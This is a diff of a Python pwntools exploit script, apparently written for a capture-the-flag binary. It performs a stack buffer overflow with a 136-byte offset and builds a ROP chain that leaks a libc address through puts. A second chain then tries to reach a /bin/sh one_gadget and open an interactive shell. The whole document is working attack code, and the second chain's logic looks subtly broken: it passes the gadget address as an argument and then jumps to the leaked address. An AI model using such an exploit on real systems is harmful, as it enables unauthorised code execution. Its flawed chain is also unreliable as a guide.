@@ -28,35 +28,55 @@ def conn():
 
 
 def main():
-    r = conn()
-    rop = ROP([exe,libc])
-    
+    p = conn()
     PUTS = exe.plt['puts']
     MAIN = exe.symbols['main']
+    rop = ROP(exe)
     LIBC_START_MAIN = exe.symbols['__libc_start_main']
 
-    rop.rdi = LIBC_START_MAIN
-    rop.call(PUTS)
-    rop.call(MAIN)
+    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
+    RET = (rop.find_gadget(['ret']))[0]
 
-    payload = fit({
-        136: rop.chain(),
-    })
-    log.info(f"sending payload: {payload}")
-    log.info(f"rop chain:\n{rop.dump()}")
-    r.sendlineafter(b"sErVeR!", payload)
-    r.recvline()
-    r.recvline()
-    resp = u64(r.recvline().strip().ljust(8,b'\x00'))
-    log.info(f"Addr: {resp:X}")
+    log.info("puts@plt: " + hex(PUTS))
+    log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
+    log.info("pop rdi gadget: " + hex(POP_RDI))
 
-    r.interactive()
-    # r.wait()
+    #create the first rop chain to leak libc address
+    JUNK = ("A"*136).encode()
+    rop = JUNK
+    rop += p64(POP_RDI)
+    rop += p64(LIBC_START_MAIN)
+    rop += p64(PUTS)
+    rop += p64(MAIN)
 
-    core = r.corefile
-    # pattern = core.read(core.rsp, 4)
-    # log.info(f"pattern is: {pattern}")
-    # log.info(f"offset: {cyclic_find(pattern)}")
+    p.sendlineafter("sErVeR!", rop)
+
+    p.recvline()
+    p.recvline()
+
+    leak = u64(p.recvline().strip().ljust(8, b'\x00'))
+    log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))
+
+
+    libc.address = leak - libc.sym["__libc_start_main"]
+    log.info("Address of libc %s " % hex(libc.address))
+
+    #second rop chain to jump to /bin/sh
+    rop2 = JUNK
+    rop2 += p64(RET)
+    rop2 += p64(POP_RDI)
+    rop2 += p64(libc.address + 0x10a45c)
+
+    #found by using one_gadget /bin/sh
+    #0x4f365
+    #0x4f3c2
+    #0x10a45c
+
+    rop2 += p64(leak)
+
+    p.sendlineafter("sErVeR!", rop2)
+
+    p.interactive()
 
 
 if __name__ == "__main__":
